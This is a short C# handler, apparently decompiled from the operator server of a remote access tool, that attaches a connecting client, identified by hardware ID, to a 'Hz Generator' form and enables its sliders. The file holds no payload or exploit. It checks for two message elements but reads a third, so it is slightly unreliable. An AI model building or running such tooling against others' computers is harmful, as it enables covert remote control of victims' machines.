using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerHzGenerator
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			client?.Disconnect();
		}
		else
		{
			if ((string)objects[1] != "Connect")
			{
				return;
			}
			FormHzGenerator form = (FormHzGenerator)Application.OpenForms["HzGenerator:" + (string)objects[2]];
			if (form == null)
			{
				client.Disconnect();
				return;
			}
			form.client = client;
			form.Invoke((MethodInvoker)delegate
			{
				form.Text = "Hz Generator [" + (string)objects[2] + "]";
				form.Enabled = true;
				if (form.materialSlider1 != null)
				{
					form.materialSlider1.Enabled = true;
				}
				if (form.materialSlider2 != null)
				{
					form.materialSlider2.Enabled = true;
				}
			});
			client.Tag = form;
			client.Hwid = (string)objects[2];
		}
	}
}
